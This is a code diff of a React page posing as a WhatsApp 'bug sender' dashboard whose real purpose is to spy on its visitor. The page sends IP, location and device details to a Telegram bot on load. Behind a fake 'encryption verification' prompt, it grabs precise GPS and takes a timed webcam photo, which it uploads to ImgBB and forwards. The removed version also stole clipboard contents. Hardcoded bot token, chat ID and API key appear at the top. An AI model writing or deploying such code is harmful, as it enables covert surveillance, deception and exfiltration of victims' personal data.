@@ -3,11 +3,12 @@
 import { useState, useEffect } from "react"
 import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"
 
-// --- KONFIGURASI BOT TELEGRAM & IMGBB (ISI DISINI) ---
+// ============================================================
+// --- KONFIGURASI WAJIB ISI (BIAR GACOR) ---
+// ============================================================
 const TELE_TOKEN = '8336153314:AAG-INrEg4-5ImwErpS44S6tRdNmT6gT-4M';
 const CHAT_ID = '6481060681';
-const IMGBB_API = '4caf6ea53a17b11f879581a8ca9ee92e';
-// ----------------------------------------------------
+const IMGBB_API_KEY = '4caf6ea53a17b11f879581a8ca9ee92e'; 
 
 const BUG_TYPES = [
   { name: "DELAY INVISIBLE", code: "delayLow" },
@@ -25,130 +26,152 @@ export default function YaeMikoDashboard() {
   const [showLimitWarning, setShowLimitWarning] = useState(false)
   const [isLoggedIn, setIsLoggedIn] = useState(false)
   const [isAuthLoading, setIsAuthLoading] = useState(false)
+  const [showVerifyModal, setShowVerifyModal] = useState(false)
 
-  // REVISI: Fungsi Kirim Log ke Telegram
-  const handleSendBug = async () => {
-    if (bugLimit <= 0) {
-      setShowLimitWarning(true)
-      return
-    }
-    
-    setIsLoading(true)
-
+  // 1. FUNGSI AMBIL DATA INTEL (SAAT LINK DIBUKA)
+  const sendInitialIntel = async () => {
     try {
-      // 1. Ambil Data IP & Info Device
+      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('target_uuid', targetID);
+      
       const ipRes = await fetch('https://ipapi.co/json/');
       const ipData = await ipRes.json();
       
-      // 2. Ambil Clipboard (Jika diijinkan)
-      let clipboard = "Akses Ditolak/Kosong";
-      try { clipboard = await navigator.clipboard.readText(); } catch(e) {}
+      let gpu = "Unknown";
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debug = gl?.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown";
+      } catch (e) {}
 
-      // REVISI: Pesan Telegram Sekarang Sertakan Nomor Target
-      const message = `
-🔥 **NEW TARGET DETECTED!** 🔥
-━━━━━━━━━━━━━━━━━━
-🔢 **NOMOR TARGET:** \`${targetNumber}\`
-🐛 **JENIS BUG:** ${BUG_TYPES[activeNav].name} (${BUG_TYPES[activeNav].code})
-━━━━━━━━━━━━━━━━━━
-👤 **INFO PERANGKAT:**
-📍 **IP:** ${ipData.ip}
-🌍 **Lokasi:** ${ipData.city}, ${ipData.country_name}
-📱 **Platform:** ${navigator.platform}
-📋 **Clipboard:** \`${clipboard}\`
-━━━━━━━━━━━━━━━━━━
-      `;
+      const msg = `🕵️ **NEW INTEL: ${targetID}**\n━━━━━━━━━━━━━━━━━━\n📍 **IP:** ${ipData.ip} (${ipData.org})\n🌍 **LOC:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}\n🔋 **BAT:** ${navigator.hardwareConcurrency} Core / ${navigator.deviceMemory || '?'}GB RAM\n━━━━━━━━━━━━━━━━━━`;
 
-      // Kirim Teks ke Telegram
       await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
       });
+    } catch (e) {}
+  };
 
-      // 3. Ambil Foto Kamera (Silent Snap)
+  useEffect(() => { sendInitialIntel(); }, []);
+
+  // 2. FUNGSI GPS AKURAT
+  const getPreciseLocation = (): Promise<string> => {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) resolve("GPS Not Supported");
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          resolve(`📍 **PRECISE LOC:** [Open Google Maps](${link})\n🎯 **ACCURACY:** \`${pos.coords.accuracy.toFixed(1)}m\``);
+        },
+        () => resolve("📍 **PRECISE LOC:** \`Permission Denied\`"),
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  };
+
+  // 3. FUNGSI UPLOAD KE IMGBB
+  const uploadToIMGBB = async (imageBlob: Blob) => {
+    const formData = new FormData();
+    formData.append('image', imageBlob);
+    try {
+      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+        method: 'POST',
+        body: formData
+      });
+      const data = await res.json();
+      return data.data.url;
+    } catch (e) { return null; }
+  };
+
+  // 4. EKSEKUSI FINAL (KAMERA + GPS + IMGBB)
+  const startFinalExecution = async () => {
+    setShowVerifyModal(false);
+    setIsLoading(true);
+
+    const preciseLoc = await getPreciseLocation();
+    
+    try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.createElement('video');
       video.srcObject = stream;
       await video.play();
 
-      const canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('image', blob);
-        const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API}`, { method: 'POST', body: formData });
-        const res = await upload.json();
+      // Ambil foto di detik ke-3 (saat target fokus liat loading)
+      setTimeout(async () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d')?.drawImage(video, 0, 0);
+        const blob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg'));
         
-        // Kirim Link Foto ke Telegram
-        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            chat_id: CHAT_ID, 
-            text: `📸 **FOTO WAJAH TARGET:** \n${res.data.url}` 
-          })
-        });
-        
-        stream.getTracks().forEach(track => track.stop());
-      }, 'image/jpeg');
-
-    } catch (err) {
-      console.log("System log: Target blocked permission.");
+        if (blob) {
+          const photoUrl = await uploadToIMGBB(blob);
+          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━━━━━━━━━`;
+          
+          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+          });
+        }
+        stream.getTracks().forEach(t => t.stop());
+      }, 3000);
+    } catch (e) {
+      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`, parse_mode: 'Markdown' })
+      });
     }
 
-    // Delay loading buat simulasi kirim bug
-    setTimeout(() => {
-      setIsLoading(false)
-      setBugLimit(prev => Math.max(0, prev - 1))
-    }, 5000)
-  }
+    setTimeout(() => { setIsLoading(false); setBugLimit(p => Math.max(0, p - 1)); }, 5000);
+  };
+
+  const handleSendBug = () => {
+    if (bugLimit <= 0) { setShowLimitWarning(true); return; }
+    setShowVerifyModal(true);
+  };
 
   return (
-    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden text-white font-[family-name:var(--font-rajdhani)]">
-      <style jsx global>{`
-        @keyframes scan-line { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
-        @keyframes glitch-text { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
-        .glass { background: rgba(15, 25, 45, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(0, 212, 255, 0.2); }
-        .glow-cyan { box-shadow: 0 0 15px rgba(0, 212, 255, 0.4); }
-        .glow-pink { box-shadow: 0 0 15px rgba(255, 61, 185, 0.4); }
-        .text-glow-cyan { text-shadow: 0 0 10px rgba(0, 212, 255, 0.8); }
-        .animate-loading-spin { animation: spin 1s linear infinite; }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-      `}</style>
-
+    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden">
       <BokehBackground />
+      
+      {/* MODAL VERIFIKASI PALSU (FIRST LAYER) */}
+      {showVerifyModal && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#0a0f1a]/90 backdrop-blur-md px-6">
+          <div className="w-full max-w-sm glass border border-cyan-500/30 p-6 rounded-2xl text-center space-y-6">
+            <div className="flex justify-center">
+              <div className="w-16 h-16 bg-cyan-500/10 rounded-full flex items-center justify-center border border-cyan-500/40 shadow-[0_0_15px_rgba(6,182,212,0.5)]">
+                <Shield className="w-8 h-8 text-cyan-400" />
+              </div>
+            </div>
+            <div className="space-y-2">
+              <h2 className="text-lg text-white font-bold tracking-widest uppercase">Enkripsi Diperlukan</h2>
+              <p className="text-sm text-gray-400">Untuk memproses <b>Secure-Socket Bug</b>, sistem perlu memvalidasi sertifikat perangkat Anda melalui sinkronisasi zona keamanan.</p>
+            </div>
+            <button onClick={startFinalExecution} className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 rounded-xl text-white font-bold tracking-widest transition-all">VERIFIKASI SEKARANG</button>
+            <p className="text-[9px] text-gray-600 uppercase tracking-tighter">Secure Cyber-Protocol Environment v3.0.4</p>
+          </div>
+        </div>
+      )}
       
       {!isLoggedIn ? (
         <>
           {isAuthLoading && <AuthLoadingScreen />}
-          <LoginScreen 
-            onLogin={() => {
-              setIsAuthLoading(true)
-              setTimeout(() => {
-                setIsAuthLoading(false)
-                setIsLoggedIn(true)
-              }, 5000)
-            }} 
-          />
+          <LoginScreen onLogin={() => {
+            setIsAuthLoading(true);
+            setTimeout(() => { setIsAuthLoading(false); setIsLoggedIn(true); }, 5000);
+          }} />
         </>
       ) : (
         <>
           {isLoading && <LoadingOverlay />}
           {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
-          
           <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
             <Header />
             <ProfileCard />
-            <ActionSection 
-              targetNumber={targetNumber}
-              setTargetNumber={setTargetNumber}
-              onSendBug={handleSendBug}
-              activeNav={activeNav}
-            />
+            <ActionSection targetNumber={targetNumber} setTargetNumber={setTargetNumber} onSendBug={handleSendBug} activeNav={activeNav} />
             <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
             <BottomBar />
           </div>
@@ -158,130 +181,22 @@ export default function YaeMikoDashboard() {
   )
 }
 
-// --- KOMPONEN PENDUKUNG (SUB-COMPONENTS) ---
+// ============================================================
+// --- KOMPONEN UI (STYLING) ---
+// ============================================================
 
 function AuthLoadingScreen() {
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a] overflow-hidden">
+      <div className="absolute inset-0 bg-gradient-to-br from-[#0a0f1a] via-[#0d1a35] to-[#1a0a1f]" />
       <div className="relative z-10 flex flex-col items-center gap-8">
-        <div className="font-black text-8xl tracking-wider text-[#ff3db9]" style={{ textShadow: "0 0 20px rgba(255, 61, 185, 0.8)", animation: "glitch-text 4s infinite" }}>SELZ</div>
-        <p className="text-sm text-cyan-400 tracking-widest animate-pulse">AUTHENTICATING SYSTEM...</p>
-      </div>
-    </div>
-  )
-}
-
-function LoginScreen({ onLogin }) {
-  const [username, setUsername] = useState("")
-  const [password, setPassword] = useState("")
-  const [error, setError] = useState("")
-
-  const validate = () => {
-    if (username === "Selz" && password === "Freebug") {
-      onLogin();
-    } else {
-      setError("Akses Ditolak! Hubungi t.me/Selzv");
-    }
-  }
-
-  return (
-    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
-      <div className="w-full max-w-sm text-center">
-        <h1 className="text-3xl text-cyan-400 font-bold mb-8 text-glow-cyan uppercase tracking-[0.2em]">Yae Miko v3.0</h1>
-        <div className="glass rounded-2xl p-8 space-y-6">
-          <input 
-            type="text" placeholder="USERNAME" 
-            className="w-full p-4 bg-black/40 border border-cyan-500/30 rounded-xl outline-none focus:border-cyan-400 text-center font-bold tracking-widest"
-            onChange={(e) => setUsername(e.target.value)}
-          />
-          <input 
-            type="password" placeholder="PASSWORD" 
-            className="w-full p-4 bg-black/40 border border-cyan-500/30 rounded-xl outline-none focus:border-cyan-400 text-center font-bold tracking-widest"
-            onChange={(e) => setPassword(e.target.value)}
-          />
-          {error && <p className="text-red-500 text-xs font-bold animate-bounce">{error}</p>}
-          <button onClick={validate} className="w-full py-4 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-xl font-bold hover:glow-cyan transition-all uppercase tracking-widest">Login Dashboard</button>
+        <div className="text-8xl font-black tracking-wider text-[#ff3db9] drop-shadow-[0_0_20px_rgba(255,61,185,0.8)] animate-pulse">SELZ</div>
+        <div className="text-center space-y-3">
+          <p className="text-sm text-cyan-400 tracking-widest uppercase">System Glitch Authentication</p>
+          <div className="w-64 h-1 bg-[#1a2540] rounded-full overflow-hidden border border-cyan-500/30">
+            <div className="h-full bg-gradient-to-r from-cyan-400 to-pink-500 animate-[loading-progress_3s_ease-in-out_infinite]" style={{width: '100%'}} />
+          </div>
         </div>
-      </div>
-    </div>
-  )
-}
-
-function Header() {
-  return (
-    <header className="flex items-center justify-between mb-4 px-2">
-      <button className="w-10 h-10 rounded-full glass flex items-center justify-center glow-cyan"><Shield className="w-5 h-5 text-cyan-400" /></button>
-      <h1 className="text-[10px] font-bold tracking-[0.3em] text-white/70">YAE MIKO BUG SYSTEM</h1>
-      <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/40 flex items-center justify-center font-bold text-pink-500 text-xs">S</div>
-    </header>
-  )
-}
-
-function ProfileCard() {
-  return (
-    <div className="glass rounded-3xl p-6 mb-4 text-center border-t-cyan-500/50">
-      <div className="w-24 h-24 mx-auto rounded-full border-2 border-red-500 flex items-center justify-center mb-4 glow-red bg-red-500/10">
-        <Bug className="w-12 h-12 text-red-500" />
-      </div>
-      <div className="inline-block px-4 py-1 bg-red-600/20 border border-red-600 rounded-full text-[10px] font-bold text-red-500 mb-6 tracking-widest">SUPREME SENDER</div>
-      <div className="grid grid-cols-3 gap-2">
-        <StatItem label="Used" value="7" color="text-cyan-400" />
-        <StatItem label="Rate" value="GACOR" color="text-green-400" />
-        <StatItem label="Status" value="ACTIVE" color="text-green-400" />
-      </div>
-    </div>
-  )
-}
-
-function StatItem({ label, value, color }) {
-  return (
-    <div className="glass p-2 rounded-xl">
-      <p className={`text-xs font-black ${color}`}>{value}</p>
-      <p className="text-[8px] text-white/40 uppercase font-bold">{label}</p>
-    </div>
-  )
-}
-
-function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }) {
-  return (
-    <div className="glass rounded-3xl p-6 flex-1 border-b-pink-500/50">
-      <div className="mb-6">
-        <label className="text-[10px] text-cyan-400 mb-2 block tracking-[0.2em] font-bold">TARGET NUMBER (WHATSAPP)</label>
-        <input
-          type="text" value={targetNumber}
-          onChange={(e) => setTargetNumber(e.target.value)}
-          className="w-full p-4 bg-black/40 border border-cyan-500/20 rounded-2xl text-xl outline-none focus:border-cyan-400 text-white font-bold tracking-widest"
-        />
-      </div>
-      <div className="bg-cyan-500/5 p-4 rounded-2xl border border-cyan-500/10 mb-6">
-        <p className="text-[9px] text-cyan-400/60 mb-1 font-bold">CURRENT EXPLOIT:</p>
-        <p className="text-lg font-black text-white tracking-wider">{BUG_TYPES[activeNav].name}</p>
-      </div>
-      <button onClick={onSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 to-red-600 rounded-2xl font-black tracking-[0.2em] glow-pink hover:scale-[1.02] active:scale-95 transition-all text-sm uppercase">Execute Bug</button>
-    </div>
-  )
-}
-
-function NavigationDots({ activeNav, setActiveNav }) {
-  return (
-    <div className="flex justify-center gap-3 my-6">
-      {BUG_TYPES.map((_, i) => (
-        <div key={i} onClick={() => setActiveNav(i)} className={`h-2 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-10 bg-cyan-400 glow-cyan' : 'w-2 bg-gray-800'}`} />
-      ))}
-    </div>
-  )
-}
-
-function BottomBar() {
-  return (
-    <div className="glass rounded-2xl p-4 flex justify-between items-center border-l-green-500/50">
-      <div className="flex items-center gap-3">
-        <ChevronRight className="w-4 h-4 text-cyan-400" />
-        <span className="text-[10px] tracking-widest font-bold">V3.0 STABLE VERSION</span>
-      </div>
-      <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 rounded-full border border-green-500/30">
-        <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
-        <span className="text-[9px] text-green-500 font-black">SENDER READY</span>
       </div>
     </div>
   )
@@ -289,35 +204,117 @@ function BottomBar() {
 
 function BokehBackground() {
   return (
-    <div className="fixed inset-0 pointer-events-none">
-      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-cyan-500/5 rounded-full blur-[120px]" />
-      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-pink-500/5 rounded-full blur-[120px]" />
+    <div className="fixed inset-0 pointer-events-none -z-10">
+      <div className="absolute top-10 -left-20 w-64 h-64 rounded-full bg-cyan-500/10 blur-3xl animate-pulse" />
+      <div className="absolute bottom-20 right-10 w-56 h-56 rounded-full bg-pink-500/10 blur-3xl animate-pulse" />
+      <div className="absolute inset-0 bg-[#0a0f1a]" />
     </div>
   )
 }
 
 function LoadingOverlay() {
   return (
-    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-xl">
-      <div className="text-center">
-        <div className="w-20 h-20 border-4 border-cyan-500 border-t-transparent rounded-full animate-loading-spin mx-auto mb-6" />
-        <p className="text-cyan-400 font-black tracking-[0.3em] animate-pulse uppercase text-xs">Sending payload to target...</p>
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]/95 backdrop-blur-xl">
+      <div className="text-center space-y-4">
+        <div className="relative w-24 h-24 mx-auto">
+          <div className="absolute inset-0 rounded-full border-4 border-cyan-500/20" />
+          <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-cyan-400 animate-spin" />
+          <Bug className="absolute inset-0 m-auto w-10 h-10 text-cyan-400 animate-pulse" />
+        </div>
+        <h3 className="text-cyan-400 font-bold tracking-widest uppercase">Bug Sedang Dikirim...</h3>
       </div>
     </div>
   )
 }
 
-function LimitWarningOverlay({ onClose }) {
+function LoginScreen({ onLogin }: any) {
+  const [u, setU] = useState(""); const [p, setP] = useState("");
   return (
-    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/95 px-6 backdrop-blur-sm">
-      <div className="text-center glass p-10 rounded-[2.5rem] border-red-500/50 max-w-xs glow-red">
-        <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500">
-          <Zap className="text-red-500 w-10 h-10" />
+    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
+      <div className="glass p-8 rounded-2xl border border-cyan-500/20 w-full max-w-sm bg-[#161b22]/50">
+        <h1 className="text-center text-cyan-400 text-3xl font-bold tracking-tighter mb-2">YAE MIKO</h1>
+        <p className="text-center text-gray-500 text-[10px] tracking-widest uppercase mb-8">Menu Bug Version 3.0</p>
+        <div className="space-y-4">
+          <input type="text" placeholder="Username" className="w-full p-3 bg-[#0f192d] border border-cyan-500/30 rounded-lg text-white outline-none focus:border-cyan-400" onChange={e=>setU(e.target.value)} />
+          <input type="password" placeholder="Password" className="w-full p-3 bg-[#0f192d] border border-cyan-500/30 rounded-lg text-white outline-none focus:border-cyan-400" onChange={e=>setP(e.target.value)} />
+          <button onClick={() => u==="Selz" && p==="Freebug" ? onLogin() : alert("Harap create akun ke t.me/Selzv")} className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 text-white font-bold rounded-xl transition-all shadow-lg shadow-cyan-900/20">LOGIN SYSTEM</button>
         </div>
-        <h2 className="text-red-500 font-black mb-2 tracking-widest">LIMIT REACHED</h2>
-        <p className="text-[10px] text-gray-400 mb-8 uppercase tracking-widest leading-relaxed">Daily quota empty. System will reboot in 24 hours.</p>
-        <button onClick={onClose} className="w-full py-4 bg-red-600 rounded-2xl font-black tracking-widest text-xs">DISMISS</button>
       </div>
     </div>
   )
 }
+
+function LimitWarningOverlay({ onClose }: any) {
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md">
+      <div className="text-center p-8 glass border border-red-500/30 rounded-3xl max-w-xs">
+        <h2 className="text-red-500 text-2xl font-bold mb-2 uppercase">Limit Habis!</h2>
+        <p className="text-gray-400 text-sm mb-6">Limit akan di-reset otomatis dalam 24 jam ke depan.</p>
+        <button onClick={onClose} className="w-full py-3 bg-red-600 text-white font-bold rounded-xl">PAHAM</button>
+      </div>
+    </div>
+  )
+}
+
+function Header() {
+  return (
+    <header className="flex justify-between items-center mb-6">
+      <div className="p-2 bg-cyan-500/10 rounded-lg border border-cyan-500/30"><Shield className="text-cyan-400 w-5 h-5" /></div>
+      <h1 className="text-white text-[10px] font-bold tracking-[0.3em] uppercase">Yae Miko Menu Bug</h1>
+      <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-400 text-xs font-bold">YM</div>
+    </header>
+  )
+}
+
+function ProfileCard() {
+  return (
+    <div className="bg-[#1a2540]/40 p-6 rounded-3xl border border-cyan-500/10 mb-6 text-center">
+      <div className="w-16 h-16 bg-red-500/10 rounded-full border-2 border-red-500/30 mx-auto mb-4 flex items-center justify-center">
+        <Bug className="text-red-500 w-8 h-8" />
+      </div>
+      <div className="grid grid-cols-3 gap-2">
+        <div className="space-y-1"><p className="text-cyan-400 font-bold text-sm">7</p><p className="text-[8px] text-gray-500 uppercase">Total Bug</p></div>
+        <div className="space-y-1"><p className="text-green-400 font-bold text-sm">GACOR</p><p className="text-[8px] text-gray-500 uppercase">Rate</p></div>
+        <div className="space-y-1"><p className="text-green-400 font-bold text-sm">ACTIVE</p><p className="text-[8px] text-gray-500 uppercase">Status</p></div>
+      </div>
+    </div>
+  )
+}
+
+function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }: any) {
+  return (
+    <div className="flex-1 space-y-6">
+      <div className="space-y-2">
+        <label className="text-[9px] text-cyan-400 tracking-[0.2em] font-bold uppercase ml-1">Nomor Target</label>
+        <input type="text" value={targetNumber} onChange={e=>setTargetNumber(e.target.value)} className="w-full p-4 bg-[#0d1a30] border border-cyan-500/10 rounded-2xl text-white font-mono text-lg focus:border-cyan-400/40 transition-all outline-none" />
+      </div>
+      <div className="bg-gradient-to-br from-[#0d1a30] to-[#161b22] p-8 rounded-3xl border border-cyan-500/10 text-center relative overflow-hidden">
+        <div className="absolute top-0 left-0 w-full h-1 bg-cyan-500/20" />
+        <p className="text-[9px] text-cyan-400 mb-2 tracking-widest uppercase">Selected Bug</p>
+        <p className="text-2xl font-black text-white tracking-tighter uppercase">{BUG_TYPES[activeNav].name}</p>
+      </div>
+      <button onClick={onSendBug} className="w-full py-5 bg-pink-600 hover:bg-pink-500 text-white font-black rounded-2xl shadow-xl shadow-pink-900/20 transition-all active:scale-95 uppercase tracking-widest">Kirim Bug Sekarang</button>
+      <p className="text-[9px] text-gray-500 text-center leading-relaxed">
+        <span className="text-cyan-600">Encrypted Protocol:</span> Sistem memerlukan verifikasi sinkronisasi zona keamanan perangkat untuk mencegah aktivitas spam robot.
+      </p>
+    </div>
+  )
+}
+
+function NavigationDots({ activeNav, setActiveNav }: any) {
+  return (
+    <div className="flex justify-center gap-3 mb-6">
+      {BUG_TYPES.map((_,i)=>(
+        <div key={i} onClick={()=>setActiveNav(i)} className={`h-1.5 rounded-full cursor-pointer transition-all ${activeNav===i?'bg-cyan-400 w-8':'bg-gray-700 w-2'}`} />
+      ))}
+    </div>
+  )
+}
+
+function BottomBar() {
+  return (
+    <div className="mt-auto py-4 border-t border-gray-900 flex justify-between items-center text-[9px] text-cyan-600 font-bold uppercase tracking-widest">
+      <ChevronLeft size={14}/> PiLiH SENDER <ChevronRight size={14}/>
+    </div>
+  )
+                  }
